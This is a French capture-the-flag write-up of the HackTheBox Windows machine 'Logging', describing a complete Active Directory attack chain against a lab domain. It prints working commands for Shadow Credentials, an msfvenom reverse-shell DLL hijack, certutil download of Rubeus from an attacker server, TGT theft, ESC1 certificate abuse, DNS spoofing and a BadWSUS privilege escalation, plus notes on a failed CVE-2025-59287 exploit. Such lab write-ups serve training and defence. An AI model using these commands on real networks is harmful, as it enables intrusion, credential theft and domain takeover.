---
title: "HackTheBox - Logging"
date: 2026-04-23 20:00:00 +0200
categories: [HackTheBox, Challenge, Medium]
tags: [active-directory, windows, wsus, ad-cs, kerberos, shadow-credentials, dll-hijacking, badwsus, esc1, cve-2025-59287, certipy, rubeus, wsuks]
description: "Write-up de la machine Logging — Leak de credentials dans des logs SMB, Shadow Credentials sur un gMSA, DLL hijacking pour pivot latéral, enrollment d'un certificat AD CS vulnérable (ESC1-like) pour spoofer WSUS via BadWSUS et devenir administrateur local. Une tentative initiale d'exploitation de CVE-2025-59287 a échoué car la box est patchée."
image:
  path: /assets/img/posts/logging/logging.png
  alt: "HackTheBox - Logging"
---

## Informations sur la machine

| Propriété      | Valeur                             |
| -------------- | ---------------------------------- |
| **OS**         | Windows Server 2019 (Build 17763)  |
| **Difficulté** | Medium                             |
| **IP**         | 10.129.45.11                       |
| **Domaine**    | logging.htb (DC01.logging.htb)     |
| **Clock skew** | +7h (utiliser `faketime -f '+7h'`) |

---

## Outils utilisés

| Outil                    | Rôle                                                  |
| ------------------------ | ----------------------------------------------------- |
| **nmap**                 | Scan de ports et détection de services                |
| **smbclient**            | Énumération et lecture des shares SMB                 |
| **bloodhound-python**    | Cartographie des relations AD                         |
| **impacket-getTGT**      | Récupération d'un TGT Kerberos via password           |
| **certipy**              | Shadow Credentials + enrollment AD CS                 |
| **evil-winrm**           | Accès WinRM (NTLM hash et Kerberos)                   |
| **Rubeus.exe**           | Extraction du TGT de l'utilisateur courant (tgtdeleg) |
| **krbrelayx/dnstool.py** | Ajout d'enregistrements DNS via LDAP                  |
| **wsuks**                | Serveur WSUS malveillant pour BadWSUS                 |
| **msfvenom**             | Génération d'une DLL 32-bit pour le hijacking         |

---

## Reconnaissance

### Scan initial

```bash
nmap -sC -sV -Pn 10.129.45.11
```

Ports critiques : **53** (DNS), **80** (IIS), **88** (Kerberos), **135/139/445** (SMB), **389/636** (LDAP), **5985** (WinRM), **8530/8531** (**WSUS** HTTP/HTTPS). La présence de WSUS sur un contrôleur de domaine est un signal rouge immédiat — historiquement exploitable via BadWSUS.

Le clock skew du DC est de **+7h** par rapport à la machine attaquante, ce qui cassera toute opération Kerberos sans compensation. On utilisera `faketime -f '+7h'` sur chaque commande qui touche à Kerberos.

### Énumération SMB initiale

Des credentials initiaux sont fournis pour la box : `wallace.everette / Welcome2026@`. Énumération des shares :

```bash
smbclient -L //10.129.45.11/ -U 'wallace.everette%Welcome2026@'
```

Shares accessibles :
- `ADMIN$`, `C$`, `IPC$` (système)
- `Logs` — suspect par son nom
- `NETLOGON`, `SYSVOL` (standard AD)
- `WSUSTemp` — WSUS local publishing

Le share `Logs` est listable en tant que `wallace.everette`. Téléchargement de son contenu :

```bash
smbclient //10.129.45.11/Logs -U 'wallace.everette%Welcome2026@' \
  -c 'prompt OFF; mget *'
```

### Leak de credentials dans les logs IdentitySync

L'analyse des logs révèle une séquence d'événements d'authentification pour `svc_recovery` :

- Février 2026 : échecs d'authentification avec `Em3rg3ncyPa$$2025`
- Mars 2026 : succès avec `Em3rg3ncyPa$$2026`

Pattern clair d'un compte de service dont le mot de passe est **incrémenté annuellement**. Le mot de passe courant est `Em3rg3ncyPa$$2026`.

### Cartographie des relations AD via BloodHound

```bash
bloodhound-python -u 'wallace.everette' -p 'Welcome2026@' \
  -d logging.htb -ns 10.129.45.11 -c all
```

Constats critiques :
- `svc_recovery` est membre de **Protected Users** (authentification Kerberos uniquement, pas de NTLM)
- `svc_recovery` a **GenericWrite** sur `msa_health$` (un gMSA)
- `msa_health$` est membre de **Remote Management Users** (Evil-WinRM)
- `jaylee.clifton` est membre du groupe **IT**, qui a des droits d'enrollment sur un template AD CS nommé `UpdateSrv`
- `toby.brynleigh` est Domain Admin

La chaîne d'exploitation se dessine naturellement.

---

## Phase 1 — svc_recovery → msa_health$ (Shadow Credentials)

### Récupération du TGT Kerberos pour svc_recovery

Puisque `svc_recovery` est dans Protected Users, on ne peut pas utiliser NTLM. On récupère un TGT via mot de passe :

```bash
faketime -f '+7h' impacket-getTGT \
  logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip 10.129.45.11
export KRB5CCNAME=$(pwd)/svc_recovery.ccache
```

### Shadow Credentials sur msa_health$

`svc_recovery` a `GenericWrite` sur `msa_health$`. Ce droit permet de modifier l'attribut `msDS-KeyCredentialLink` du compte cible, ce qui est la base de l'attaque **Shadow Credentials** (PKINIT / Whisker). On s'en sert pour récupérer le NT hash du gMSA :

```bash
faketime -f '+7h' certipy shadow auto \
  -u svc_recovery@logging.htb -k \
  -target DC01.logging.htb \
  -account 'msa_health$'
```

Résultat : `NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5`.

---

## Phase 2 — Pivot vers jaylee.clifton via DLL Hijacking

### Accès WinRM en tant que msa_health$

Le gMSA `msa_health$` étant membre de Remote Management Users, on peut ouvrir une session Evil-WinRM avec son hash :

```bash
faketime -f '+7h' evil-winrm -i DC01.logging.htb -u 'msa_health$' \
  -H '603fc24ee01a9409f83c9d1d701485c5'
```

### Découverte du DLL hijack

Exploration du filesystem depuis cette session : `C:\ProgramData\UpdateMonitor\` contient une référence à un fichier `Settings_Update.zip`. Une tâche planifiée nommée **UpdateChecker Agent** s'exécute toutes les **3 minutes** en tant que `jaylee.clifton` :

1. Lit `C:\ProgramData\UpdateMonitor\Settings_Update.zip`
2. Décompresse dans `C:\Program Files\UpdateMonitor\bin\`
3. Appelle `LoadLibrary("settings_update.dll")`

Classique — on contrôle le contenu du ZIP, donc on contrôle la DLL chargée dans le contexte de jaylee.clifton.

### Génération de la DLL malveillante

**Point d'attention critique** : l'exécutable parent est **32-bit**, donc la DLL doit être PE32 (x86) et non PE32+ (x64). Toute erreur ici crashe silencieusement le processus et rend la box inexploitable jusqu'au prochain reset.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=9001 \
  -a x86 --platform windows -f dll -o settings_update.dll

file settings_update.dll
# settings_update.dll: PE32 executable (DLL)  ← doit être "PE32", PAS "PE32+"

zip Settings_Update.zip settings_update.dll
```

### Déclenchement et capture du reverse shell

Terminal 1 — listener :

```bash
rlwrap nc -lvnp 9001
```

Terminal 2 — depuis la session Evil-WinRM `msa_health$` :

```powershell
upload Settings_Update.zip
copy Settings_Update.zip C:\ProgramData\UpdateMonitor\Settings_Update.zip
```

Après ~3 minutes, la tâche planifiée se déclenche et un reverse shell `cmd.exe` en tant que `logging\jaylee.clifton` tombe sur le listener.

```cmd
C:\Windows\system32>whoami
logging\jaylee.clifton
```

Le user flag est récupéré depuis `C:\Users\jaylee.clifton\Desktop\user.txt`.

---

## Tentative infructueuse — CVE-2025-59287 (WSUS RCE)

Avant d'attaquer WSUS par la voie BadWSUS, une tentative d'exploitation de **CVE-2025-59287** a été menée. Il s'agit d'une vulnérabilité de deserialization dans le `ReportingWebService` de WSUS qui permet une RCE non authentifiée en SYSTEM via un objet `SynchronizationUpdateErrorsKey` malveillant contenu dans un `ReportEventBatch`.

Un payload reverse shell a été construit en modifiant le blob `BinaryFormatter` du PoC HawkTrace (gadget `TextFormattingRunProperties` → XAML `ObjectDataProvider` → `Process.Start`). Comme mon Linux ne pouvait pas exécuter ysoserial.net (dépendance à `PresentationCore.dll`, Windows-only), j'ai écrit un script Python qui réencode le XAML en place et recalcule le préfixe LEB128 de la longueur du string .NET :

```python
def encode_7bit_int(value):
    out = bytearray()
    v = value
    while v >= 0x80:
        out.append((v & 0x7F) | 0x80)
        v >>= 7
    out.append(v & 0x7F)
    return bytes(out)
```

L'exploit a bien envoyé le payload, mais la réponse SOAP était :

```xml
<ReportEventBatchResult>false</ReportEventBatchResult>
```

Inspection des logs WSUS (`C:\Program Files\Update Services\LogFiles\SoftwareDistribution.log`) via la session `msa_health$` :

```
w3wp.36 ReportingEvent.ValidateMiscData Successfully parsed MiscData for event InstanceId: 81434ba2-...
w3wp.36 WebService.ValidateEventBatch   Event in batch failed to validate.
        Exception: Attempted to set UpdateErrors to an unknown/invalid value.
```

La validation de `SynchronizationUpdateErrorsKey` se fait **avant** la deserialization. Produit Version `10.0.17763.8641` — la box porte bien le patch out-of-band d'octobre 2025 (KB5070883). Cette voie est condamnée, retour à l'attaque classique BadWSUS.

---

## Phase 3 — jaylee.clifton → Administrateur local (BadWSUS + ESC1-like)

### Plan d'attaque

WSUS sur DC01 tourne sur `wsus.logging.htb:8531` (HTTPS). L'enregistrement DNS `wsus.logging.htb` **n'existe pas** dans la zone DNS Active Directory. Stratégie :

1. Créer l'enregistrement DNS `wsus.logging.htb → <IP attaquant>` via LDAP (avec le TGT svc_recovery)
2. Obtenir un certificat TLS valide pour `wsus.logging.htb`, signé par le CA du domaine, via le template `UpdateSrv` (enrollable par `jaylee.clifton`)
3. Monter un faux serveur WSUS avec `wsuks` servant un fake update
4. La tâche planifiée **Scheduled Start** démarre `wuauserv`, qui check les updates auprès de notre faux WSUS, télécharge et exécute le fake update (PsExec64 + commande `net localgroup ... /add`)

### Extraction du TGT de jaylee.clifton via tgtdeleg

Depuis le reverse shell `jaylee.clifton`, il faut récupérer un TGT utilisable depuis Kali. La technique `tgtdeleg` de Rubeus exploite le mécanisme de délégation Kerberos pour extraire un TGT valide **sans privilège SeDebugPrivilege**, ce qui est parfait pour un user standard.

Sur Kali, service un Rubeus.exe :

```bash
cd ~/tools/rubeus
python3 -m http.server 8000
```

Dans le reverse shell jaylee :

```cmd
cd %TEMP%
certutil -urlcache -split -f http://10.10.14.14:8000/Rubeus.exe R.exe
R.exe tgtdeleg /nowrap
```

Sortie : un blob base64 commençant par `doIFyDCC...`. C'est le TGT de `jaylee.clifton@LOGGING.HTB`.

### Conversion kirbi → ccache

```bash
echo '<BLOB_BASE64>' | base64 -d > jaylee.kirbi
impacket-ticketConverter jaylee.kirbi jaylee.ccache
export KRB5CCNAME=$(pwd)/jaylee.ccache
```

Validation que le TGT fonctionne :

```bash
faketime -f '+7h' impacket-getST -k -no-pass -dc-ip 10.129.45.11 \
  -spn ldap/DC01.logging.htb logging.htb/jaylee.clifton
# [*] Saving ticket in jaylee.clifton@ldap_DC01.logging.htb@LOGGING.HTB.ccache
```

### Enrollment du certificat sur le template UpdateSrv

Le template `UpdateSrv` présente les caractéristiques d'un ESC1 :
- **EnrolleeSuppliesSubject = True** (on choisit le Subject/SAN)
- EKU **Server Authentication** (exactement ce qu'il faut pour du TLS)
- Enrollment autorisé pour le groupe `LOGGING.HTB\IT`, dont `jaylee.clifton` est membre

Enrollment avec Certipy en authentification Kerberos :

```bash
faketime -f '+7h' certipy req \
  -k -no-pass \
  -u jaylee.clifton@logging.htb \
  -ca logging-DC01-CA \
  -target DC01.logging.htb \
  -dc-ip 10.129.45.11 \
  -dc-host DC01.logging.htb \
  -template UpdateSrv \
  -upn wsus.logging.htb \
  -dns wsus.logging.htb
```

Résultat :

```
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'wsus.logging.htb'
    DNS Host Name: 'wsus.logging.htb'
[*] Saving certificate and private key to 'wsus.logging.htb_wsus.pfx'
```

Extraction cert + clé en PEM et combinaison pour wsuks :

```bash
openssl pkcs12 -in wsus.logging.htb_wsus.pfx -out wsus_cert.pem -clcerts -nokeys -password pass:
openssl pkcs12 -in wsus.logging.htb_wsus.pfx -out wsus_key.pem -nocerts -nodes -password pass:
cat wsus_cert.pem wsus_key.pem > wsus_combined.pem
```

### Ajout de l'enregistrement DNS wsus.logging.htb

Avec le TGT `svc_recovery` (qui peut créer des enregistrements DNS dans la zone AD) :

```bash
faketime -f '+7h' impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip 10.129.45.11
export KRB5CCNAME=$(pwd)/svc_recovery.ccache

faketime -f '+7h' python3 ~/tools/krbrelayx/dnstool.py \
  -u logging.htb\\svc_recovery -k -a add \
  -r wsus.logging.htb -d 10.10.14.14 \
  -dns-ip 10.129.45.11 -dc-ip 10.129.45.11 DC01.logging.htb
```

Vérification :

```bash
nslookup wsus.logging.htb 10.129.45.11
# Name:   wsus.logging.htb
# Address: 10.10.14.14
```

### Lancement du faux WSUS avec wsuks

Installation de wsuks via pipx, puis fix de la dépendance `python3-nftables` (wsuks utilise le binding Python, pas le binaire CLI) :

```bash
pipx install wsuks
sudo apt install -y nftables python3-nftables
sudo systemctl enable --now nftables

# Injection du module nftables système dans le venv pipx de wsuks
WSUKS_SITE=$(ls -d ~/.local/share/pipx/venvs/wsuks/lib/python*/site-packages/)
SYSTEM_NFT=$(python3 -c "import nftables, os; print(os.path.dirname(nftables.__file__))")
sudo ln -sf $SYSTEM_NFT $WSUKS_SITE/nftables
```

Premier tir avec la commande par défaut (PowerShell `Add-LocalGroupMember`) : la commande est mal parsée côté serveur, `jaylee.clifton` n'est pas ajouté. Deuxième tir avec un `net localgroup ... /add` qui est plus fiable :

```bash
sudo env "PATH=$PATH" wsuks \
  --serve-only \
  -t 10.129.45.11 \
  -u jaylee.clifton \
  -d logging.htb \
  --tls-cert wsus_combined.pem \
  -I tun0 \
  -c "/accepteula /s cmd.exe /c \"net localgroup Administrators logging.htb\\jaylee.clifton /add\""
```

Cycle d'exploitation dans les logs wsuks :

```
[+] Received POST  /ClientWebService/client.asmx  (GetConfig)
[+] Received POST  /ClientWebService/client.asmx  (GetCookie)
[+] Received POST  /ClientWebService/client.asmx  (SyncUpdates)
[+] Received POST  /ClientWebService/client.asmx  (GetExtendedUpdateInfo)
[+] Received GET   /bcb8c789-.../PsExec64.exe
[+] Received POST  /ReportingWebService/ReportingWebService.asmx  (ReportEventBatch)
```

Le `ReportEventBatch` final signale que le client a fini d'installer le « patch ». Vérification depuis la session Evil-WinRM `msa_health$` :

```powershell
net localgroup Administrators
# Members
# -------------------------------------------------------------------------------
# Administrator
# Domain Admins
# Enterprise Admins
# jaylee.clifton     ← nouvelle entrée
# toby.brynleigh
```

---

## Phase 4 — Root flag

### Accès WinRM en tant que jaylee.clifton (désormais admin local)

Evil-WinRM avec le TGT Kerberos de jaylee :

```bash
export KRB5CCNAME=$(pwd)/jaylee.ccache
faketime -f '+7h' evil-winrm -i DC01.logging.htb -r LOGGING.HTB
```

```powershell
whoami /groups | findstr /i admin
# BUILTIN\Administrators   Alias     S-1-5-32-544
```

### Localisation du flag

Le flag n'est pas dans `C:\Users\Administrator\Desktop\` (le compte n'a pas de session interactive). L'administrateur « humain » de la box est `toby.brynleigh` :

```powershell
dir C:\Users\
type C:\Users\toby.brynleigh\Desktop\root.txt
```

---

## Flags

```bash
# Reverse shell jaylee.clifton (via DLL hijack)
type C:\Users\jaylee.clifton\Desktop\user.txt

# Evil-WinRM jaylee.clifton admin local
type C:\Users\toby.brynleigh\Desktop\root.txt
```

---

## Récapitulatif de la chaîne d'exploitation

```
wallace.everette (credentials initiaux)
  │
  └─ SMB share "Logs"
      └─ Leak password svc_recovery (pattern annuel : Em3rg3ncy$$YYYY)
          │
          └─ impacket-getTGT svc_recovery (Protected Users → Kerberos only)
              │
              ├─ BloodHound : svc_recovery --GenericWrite--> msa_health$ (gMSA)
              │   │
              │   └─ certipy shadow auto → NT hash msa_health$
              │       │
              │       └─ Evil-WinRM (Remote Management Users)
              │           │
              │           └─ DLL hijack scheduled task "UpdateChecker Agent"
              │               │  Settings_Update.zip → settings_update.dll (PE32, pas PE32+)
              │               │
              │               └─ Reverse shell jaylee.clifton (USER FLAG ✓)
              │                   │
              │                   └─ Rubeus tgtdeleg → TGT jaylee.clifton
              │                       │
              │                       └─ certipy req template UpdateSrv (ESC1-like)
              │                           │  EnrolleeSuppliesSubject=True + Server Auth EKU
              │                           │
              │                           └─ Cert TLS valide pour wsus.logging.htb
              │
              └─ dnstool.py (LDAP DNS write via svc_recovery)
                  │
                  └─ wsus.logging.htb → 10.10.14.14
                      │
                      └─ wsuks (BadWSUS avec cert CA-signé)
                          │  task "Scheduled Start" → wuauserv → check update
                          │
                          └─ Fake PsExec64 → net localgroup Administrators jaylee /add
                              │
                              └─ Evil-WinRM Kerberos en jaylee admin local
                                  │
                                  └─ C:\Users\toby.brynleigh\Desktop\root.txt ✓

(Détour infructueux : CVE-2025-59287 WSUS deserialization — patchée par KB5070883)
```

---

## Ressources

- [Shadow Credentials attack — SpecterOps (Elad Shamir)](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec)
- [Certipy — ly4k/Certipy](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned: AD CS abuse (ESC1-ESC8) — SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [BadWSUS technique — Romain Tiennot (GoSecure)](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
- [wsuks — NeffIsBack](https://github.com/NeffIsBack/wsuks)
- [Rubeus tgtdeleg — GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [krbrelayx/dnstool.py — dirkjanm](https://github.com/dirkjanm/krbrelayx)
- [CVE-2025-59287 WSUS RCE (HawkTrace PoC)](https://gist.github.com/hawktrace/76b3ea4275a5e2191e6582bdc5a0dc8b)

---

## Leçons apprises

- **Les logs applicatifs sont un vecteur sous-estimé** — le share `Logs` contenait des logs d'authentification d'un IdentitySync qui révélaient le pattern de rotation annuelle du mot de passe de `svc_recovery`. Tout compte de service dont le mot de passe change selon un pattern prévisible (année, mois, nom de société) est un sitting duck. Ne jamais laisser de logs d'authentification lisibles par des utilisateurs non privilégiés.
- **Shadow Credentials est une attaque universelle contre `GenericWrite`** — dès qu'un utilisateur a `GenericWrite` (ou mieux) sur un autre compte AD, `certipy shadow auto` récupère son NT hash en quelques secondes, même si le compte cible est un gMSA. Cette attaque ne nécessite ni NTLM, ni password, ni interaction. Les droits délégués sur des comptes de service doivent être audités avec soin.
- **Les DLL 32-bit vs 64-bit sont une source fréquente d'échecs silencieux** — un DLL hijack avec la mauvaise architecture crashe le processus hôte sans erreur visible. Toujours vérifier l'architecture du processus parent (`Get-Process` + `.ProcessorAffinity`, ou `tasklist /m`), et confirmer le format de la DLL (`file settings_update.dll` → `PE32` pour x86, `PE32+` pour x64).
- **`tgtdeleg` est la méthode la plus propre pour voler un TGT sans privilège** — contrairement aux techniques qui nécessitent `SeDebugPrivilege` (ex. `Rubeus dump`), `tgtdeleg` exploite le mécanisme de délégation GSS-API et fonctionne avec n'importe quel utilisateur authentifié au domaine. Essentiel quand on n'a pas de privilèges locaux mais qu'on veut pivoter depuis un reverse shell bancal vers une session plus stable sur Kali.
- **Les templates AD CS avec `EnrolleeSuppliesSubject=True` + EKU Server Authentication = compromission TLS triviale** — c'est la signature ESC1. Si un utilisateur low-priv peut enroll un tel template, il peut forger un certificat pour n'importe quel FQDN du domaine, et donc impersonner n'importe quel serveur HTTPS interne. Ici c'était WSUS, mais ça peut aussi bien être un serveur de gestion, un proxy, ou un service métier.
- **BadWSUS reste d'une efficacité redoutable en 2026** — quand WSUS est configuré sans SSL ou sans pinning de certificat (par défaut il accepte tout cert signé par une CA trustée), un attaquant qui contrôle le DNS et possède un cert valide peut injecter n'importe quel « update » en tant que SYSTEM sur toutes les machines du domaine. Le seul vrai fix est d'utiliser HTTPS avec un cert spécifique et de désactiver l'auto-enrollment sur les templates non-audités.
- **CVE-2025-59287 n'est pas une solution universelle pour les WSUS** — cette vulnérabilité est spectaculaire sur le papier (RCE unauth en SYSTEM), mais le patch out-of-band d'octobre 2025 (KB5070881/5070882/5070883) est désormais largement déployé, y compris dans les environnements de lab HTB. Les logs de WSUS (`SoftwareDistribution.log`) montrent exactement où la validation échoue : `Attempted to set UpdateErrors to an unknown/invalid value`. Toujours lire les logs avant de s'acharner.
- **Le faketime pour Kerberos est non-négociable** — un skew de quelques minutes suffit à casser toute opération Kerberos (`KRB_AP_ERR_SKEW`). Sur les boxes HTB avec un gros skew (+7h ici), `faketime -f '+7h'` doit être préfixé sur chaque commande qui touche à Kerberos, sans exception.

**Machine complétée**

{% include comments.html %}